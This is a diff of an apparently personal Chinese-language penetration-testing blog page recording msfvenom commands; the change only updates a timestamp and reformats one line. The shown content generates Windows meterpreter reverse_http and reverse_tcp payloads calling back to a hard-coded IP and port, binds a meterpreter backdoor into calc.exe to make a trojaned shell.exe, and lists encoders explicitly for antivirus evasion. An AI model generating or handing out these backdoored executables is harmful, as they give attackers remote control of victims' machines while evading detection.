@@ -89,7 +89,7 @@
 <meta property="og:site_name" content="tusk1&#39;Blog">
 <meta property="og:description" content="有效命令msfvenom -p windows/x64/meterpreter/reverse_http lhost=114.116.33.191 lport=8888 -f exe&amp;gt;test_3.exemsfvenom -p windows/meterpreter/reverse_http lhost=114.116.33.191 lport=8888 -f exe&amp;gt;test_4.e">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-10-03T08:35:32.609Z">
+<meta property="og:updated_time" content="2019-10-03T08:53:20.099Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="渗透测试笔记4-msfvenom命令记录">
 <meta name="twitter:description" content="有效命令msfvenom -p windows/x64/meterpreter/reverse_http lhost=114.116.33.191 lport=8888 -f exe&amp;gt;test_3.exemsfvenom -p windows/meterpreter/reverse_http lhost=114.116.33.191 lport=8888 -f exe&amp;gt;test_4.e">
@@ -368,7 +368,7 @@
 <p>msfvenom –p windows/meterpreter/reverse_tcp –i 3 –e x86/shikata_ga_nai –f exe –o C:\back.exe</p>
 </blockquote>
 </blockquote>
-<h4 id="捆绑到正常文件后生成payload（暂未测试是否可加-e参数）"><a href="#捆绑到正常文件后生成payload（暂未测试是否可加-e参数）" class="headerlink" title="捆绑到正常文件后生成payload（暂未测试是否可加-e参数）"></a>捆绑到正常文件后生成payload（暂未测试是否可加-e参数）</h4><p>Msfvenom –p windows/meterpreter/reverse_tcp –platform windows –a x86 –x C:\calc.exe –k –f exe –o C:\shell.exe</p>
+<h4 id="捆绑到正常文件后生成payload（暂未测试是否可加-e参数）"><a href="#捆绑到正常文件后生成payload（暂未测试是否可加-e参数）" class="headerlink" title="捆绑到正常文件后生成payload（暂未测试是否可加-e参数）"></a>捆绑到正常文件后生成payload（暂未测试是否可加-e参数）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Msfvenom –p windows/meterpreter/reverse_tcp –platform windows –a x86 –x C:\calc.exe –k –f exe –o C:\shell.exe</span><br></pre></td></tr></table></figure>
 <h4 id="查看支持的payload列表"><a href="#查看支持的payload列表" class="headerlink" title="查看支持的payload列表"></a>查看支持的payload列表</h4><p>msfvenom -l payloads</p>
 <h4 id="查看支持的输出文件类型"><a href="#查看支持的输出文件类型" class="headerlink" title="查看支持的输出文件类型"></a>查看支持的输出文件类型</h4><p>msfvenom –help-formats</p>
 <h4 id="查看支持的编码方式：-为了达到免杀的效果"><a href="#查看支持的编码方式：-为了达到免杀的效果" class="headerlink" title="查看支持的编码方式：(为了达到免杀的效果)"></a>查看支持的编码方式：(为了达到免杀的效果)</h4><p>msfvenom -l encoders</p>
